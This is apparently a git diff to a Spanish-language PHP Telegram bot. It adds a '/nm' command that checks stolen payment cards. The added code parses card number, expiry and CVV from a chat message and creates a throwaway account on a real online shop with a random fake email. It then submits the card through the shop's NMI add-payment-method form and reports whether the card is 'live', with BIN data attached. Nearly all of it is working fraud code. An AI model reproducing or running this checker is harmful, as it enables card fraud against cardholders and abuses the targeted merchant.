@@ -11,6 +11,7 @@ header("Expires: Sat, 26 Jul 1997 05:00:00 GMT"); // Date in the past
 header("Pragma: no-cache");
 
 include("config.php");
+include("CRH.php");
 //------TOKEN DEL BOT MIKASA ACKERMAN--------//
 //$token = "5405339405:AAG0kGkeN-8VueVsI2JCLQbHI3wYSnfoG7Y";
 
@@ -37,6 +38,18 @@ $user = $update["from"]["username"];
 //4915110191768499-4915110176928790
 //4915110176928790-4915110191768499
 //-------------------FUNCIONES------------------//
+
+$curlHandler = new CurlRequestHandler();
+$i = $curlHandler->GenerateCorreo();
+
+
+$nombres = array("Juan", "María", "Pedro", "Ana", "Carlos", "Luisa", "Jorge", "Sofía");
+$nombre = $nombres[rand(0, count($nombres) - 1)];
+
+$fn = array("@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@icloud.com", "@mail.com", "@aol.com");
+$fin = $fn[rand(0, count($fn) - 1)];
+$num = rand(1, 100);
+$correo = "$nombre$num$fin";
 
 function capture($string, $start, $end){
 $str = explode($start, $string);
@@ -168,6 +181,9 @@ $live_array = array(
     '"cvc_check": "pass"',
     '"status": "succeeded"',
     'Your payment has already been processed',
+    'Nice! New payment method added',
+    'ApprovedApproved',
+    'Approved',
     'insufficient_funds',
     'Your card has insufficient funds.',
     "Your card's security code is invalid.",
@@ -1304,6 +1320,274 @@ editMessage($chat_id,$respuesta,$id_text);
 }
 
 
+	
+elseif((strpos($message, "!nm") === 0)||(strpos($message, "/nm") === 0)||(strpos($message, ".nm") === 0)){
+
+$lista = substr($message, 4);
+$i     = explode("|", $lista);
+$cc    = $i[0];
+$mes   = $i[1];
+$ano  = $i[2];
+$cvv   = $i[3];
+
+$bin = substr($lista, 0, 6);
+
+
+////
+$num = "$cc$mes$ano$cvv";
+//-----------------------------------------------------//
+$verify = substr($cc, 16, 1);
+if($verify != ""){
+$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
+sendMessage($chat_id,$respuesta, $message_id);
+die();
+}
+
+if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
+}else{
+$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ch cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !ch cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .ch cc|m|y|cvv\n";
+sendMessage($chat_id,$respuesta, $message_id);
+die();
+}
+
+
+//----------------MENSAGE DE ESPERA-------------------//
+$respuesta = "<b>🕒 Wait for Result...</b>";
+sendMessage($chat_id,$respuesta, $message_id);
+//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
+$id_text = file_get_contents("ID");
+//----------------------------------------------------//
+
+$startTime = microtime(true); //TIEMPO DE INICIO
+$curl = curl_init('https://lookup.binlist.net/'.$bin.'');
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
+$result = curl_exec($curl);
+curl_close($curl);
+//---------------------------------------------//
+$bank = capture($result, '"bank": {"name": "', '"');
+$emoji = capture($result, '"emoji":"', '"');
+$alpha = strtoupper(capture($result, '"alpha2":"', '"'));
+$scheme = strtoupper(capture($result, '"scheme":"', '"'));
+$type = strtoupper(capture($result, '"type":"', '"'));
+$currency = capture($result, '"currency":"', '"');
+//---------------------------------------------//
+if (empty($bank)) {
+$bank = "Unavailable";
+}
+if (empty($emoji)) {
+$emoji = "Unavailable";
+}
+if (empty($alpha)) {
+$alpha = "Unavailable";
+}
+if (empty($scheme)) {
+$scheme = "Unavailable";
+}
+if (empty($type)) {
+$type = "Unavailable";
+}
+if (empty($currency)) {
+$currency = "Unavailable";
+}
+$curl = curl_init('https://binlist.io/lookup/'.$bin.'');
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
+$content = curl_exec($curl);
+curl_close($curl);
+$binna = json_decode($content,true);
+//---------------------------------------------//
+$level = $binna['category'];
+$brand = $binna['scheme'];
+$country = $binna['country']['name'];
+$type = $binna['type'];
+$bank = $binna['bank']['name'];
+$count = "".$country." - ".$alpha." ".$emoji."";
+if (empty($level)) {
+$level = "Unavailable";
+}
+if (empty($brand)) {
+$brand = "Unavailable";
+}
+if (empty($country)) {
+$country = "Unavailable";
+}
+if (empty($type)) {
+$type = "Unavailable";
+}
+if (empty($bank)) {
+$bank = "Unavailable";
+}
+if (empty($currency)) {
+$count = "Unavailable";
+}
+////RANDOM USER//
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$get = curl_exec($ch);
+curl_close($ch);
+        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
+        $name = $matches1[1][0];
+        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
+        $last = $matches1[1][0];
+        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
+        $email = $matches1[1][0];
+        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
+        $street = $matches1[1][0];
+        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
+        $city = $matches1[1][0];
+        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
+        $state = $matches1[1][0];
+        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
+        $phone = $matches1[1][0];
+        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
+        $postcode = $matches1[1][0];
+
+
+
+
+
+
+
+/* usar proxies si deseas:
+$curlHandler->RotatingProxies($ipandport, $userandpass);*/
+
+$response = $curlHandler->performCurlRequest(
+    'https://www.warfighterhemp.com/my-account/add-payment-method/',
+    'GET',
+    [
+        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'cache-control: max-age=0',
+        'upgrade-insecure-requests: 1',
+        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
+    ],
+);
+$nonce1 = $curlHandler->capture($response, '<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="','" />');
+
+$response = $curlHandler->performCurlRequest(
+    'https://www.warfighterhemp.com/create-account/',
+    'POST',
+    [
+        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'cache-control: max-age=0',
+        'content-type: application/x-www-form-urlencoded',
+        'origin: https://www.warfighterhemp.com',
+        'referer: https://www.warfighterhemp.com/create-account/',
+        'upgrade-insecure-requests: 1',
+        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
+    ],
+    'email='.$correo.'&password=CanaryFreeSktd828&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F&wc_order_attribution_session_start_time='.date('Y-m-d') . '+' . urlencode(date('H:i:s')).'&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F127.0.0.0+Safari%2F537.36&srp_birthday_date=1999-05-02&woocommerce-register-nonce='.$nonce1.'&_wp_http_referer=%2Fcreate-account%2F&register=Register'
+);
+
+$response = $curlHandler->performCurlRequest(
+    'https://www.warfighterhemp.com/my-account/add-payment-method/',
+    'GET',
+    [
+        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'referer: https://www.warfighterhemp.com/my-account/payment-methods/',
+        'upgrade-insecure-requests: 1',
+        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
+    ],
+);
+$nonce2 = $curlHandler->capture($response, '<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="','" />');
+
+$response = $curlHandler->performCurlRequest(
+    'https://www.warfighterhemp.com/my-account/add-payment-method/',
+    'POST',
+    [
+        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'cache-control: max-age=0',
+        'content-type: application/x-www-form-urlencoded',
+        'origin: https://www.warfighterhemp.com',
+        'referer: https://www.warfighterhemp.com/my-account/add-payment-method/',
+        'upgrade-insecure-requests: 1',
+        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
+    ],
+    'payment_method=nmi_gateway_woocommerce_credit_card&wc-nmi-gateway-woocommerce-credit-card-account-number='.$cc.'&wc-nmi-gateway-woocommerce-credit-card-expiry='.$mes.'+%2F+'.$ano.'&wc-nmi-gateway-woocommerce-credit-card-csc='.$cvv.'&woocommerce-add-payment-method-nonce='.$nonce2.'&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1'
+);
+$result1 = (strpos($response, "Nice! New payment method added") !== false) ? "Approved" : trim(strip_tags($curlHandler->capture($response, '<ul class="woocommerce-error" role="alert">', '</ul>'))) ?? "An error occurred, please try again ";
+
+$timetakeen = (microtime(true) - $startTime);
+$time = substr_replace($timetakeen, '',4);
+//------------------------------------------------------------------//
+$cvc_check = trim(strip_tags(getStr($result1,'"cvc_check":"','"')));
+$decline_check = trim(strip_tags(getStr($result1,'"decline_code":"','"')));
+//------------------------------------------------------------------//
+if($cvc_check == false){
+$proxy = "LIVE ✅";
+}else{
+$proxy = "PROXY DEAD ❌";
+}
+
+
+$bin = "<code>".$bin."</code>";
+$lista = "<code>".$lista."</code>";
+
+//$result1 = "Oops, adding your new payment method failed: The card verification number does not match. Please re-enter and try again.";
+//echo "$result1\n";
+
+if (array_in_string($result1, $live_array)) {
+                $respo = "Approved!";
+                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Nmi Auth\n━━━━━━━━•⟮ʙɪɴ ᴅᴀᴛᴀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$brand."\n➭ 𝚃𝚈𝙿𝙴: ".$type."\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."\n➭ 𝙱𝙰𝙽𝙺: ".$bank."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
+                $live = True;
+            } elseif ((strpos($result1, 'Do Not Honor'))) {
+                $respo = "Your payment method failed.";
+                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: FAILED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Nmi Auth\n━━━━━━━━•⟮ʙɪɴ ᴅᴀᴛᴀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$brand."\n➭ 𝚃𝚈𝙿𝙴: ".$type."\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."\n➭ 𝙱𝙰𝙽𝙺: ".$bank."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
+                $live = False;
+            } elseif ((strpos($result1, 'Invalid card number')) || (strpos($result1, 'The card number is invalid, please re-enter and try again.')) || (strpos($result1, 'incorrect_number'))) {
+                $respo = "You card number is invalid.";
+                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: INVALID ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Nmi Auth\n━━━━━━━━•⟮ʙɪɴ ᴅᴀᴛᴀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$brand."\n➭ 𝚃𝚈𝙿𝙴: ".$type."\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."\n➭ 𝙱𝙰𝙽𝙺: ".$bank."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
+                $live = False;
+            } elseif ((strpos($result1, 'Insufficient funds in account, please use an alternate card or other form of payment.'))) {
+                $respo = "Your card has insufficient funds.";
+                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Nmi Auth\n━━━━━━━━•⟮ʙɪɴ ᴅᴀᴛᴀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$brand."\n➭ 𝚃𝚈𝙿𝙴: ".$type."\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."\n➭ 𝙱𝙰𝙽𝙺: ".$bank."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
+                $live = False;
+            } elseif ((strpos($result1, 'incorrect')) || (strpos($result1, 'Your card number is incorrect.')) || (strpos($result1, 'incorrect_number'))) {
+                $respo = "You card number is invalid.";
+                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: INVALID ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Nmi Auth\n━━━━━━━━•⟮ʙɪɴ ᴅᴀᴛᴀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$brand."\n➭ 𝚃𝚈𝙿𝙴: ".$type."\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."\n➭ 𝙱𝙰𝙽𝙺: ".$bank."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
+                $live = False;
+            } elseif ((strpos($result1, "The card verification number does not match. Please re-enter and try again."))) {
+                $respo = "Your card's security code is incorrect.";
+                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Nmi Auth\n━━━━━━━━•⟮ʙɪɴ ᴅᴀᴛᴀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$brand."\n➭ 𝚃𝚈𝙿𝙴: ".$type."\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."\n➭ 𝙱𝙰𝙽𝙺: ".$bank."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
+                $live = False;
+
+            } elseif ((strpos($result1, 'The provided card is expired, please use an alternate card or other form of payment.'))) {
+                $respo = "Your card has expired.";
+                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: EXPIRED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Nmi Auth\n━━━━━━━━•⟮ʙɪɴ ᴅᴀᴛᴀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$brand."\n➭ 𝚃𝚈𝙿𝙴: ".$type."\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."\n➭ 𝙱𝙰𝙽𝙺: ".$bank."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
+                $live = False;
+            } elseif ((strpos($result1, 'Duplicate transaction.')) || (strpos($result1, 'The provided card is expired, please use an alternate card or other form of payment.Oops, adding your new payment method failed: The provided card is expired, please use an alternate card or other form of payment.'))) {
+                $respo = "Your transaction is duplicate.";
+                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DUPICATE ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Nmi Auth\n━━━━━━━━•⟮ʙɪɴ ᴅᴀᴛᴀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$brand."\n➭ 𝚃𝚈𝙿𝙴: ".$type."\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."\n➭ 𝙱𝙰𝙽𝙺: ".$bank."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
+                $live = False;
+            }else{
+                if(empty($respo)){
+                $respo = $result1;
+                }
+                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Nmi Auth\n━━━━━━━━•⟮ʙɪɴ ᴅᴀᴛᴀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$brand."\n➭ 𝚃𝚈𝙿𝙴: ".$type."\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."\n➭ 𝙱𝙰𝙽𝙺: ".$bank."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
+                $live = False;
+            }
+if($live) {
+editMessage($chat_id, $respuesta, $id_text);
+//echo $respuesta;
+die();
+} else {
+//echo $respuesta;
+editMessage($chat_id, $respuesta, $id_text);
+die();
+}
+//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
+ob_flush();
+}
+
+
+
+
+
+
+
+	
 
 elseif((strpos($message, "!ch") === 0)||(strpos($message, "/ch") === 0)||(strpos($message, ".ch") === 0)){
 
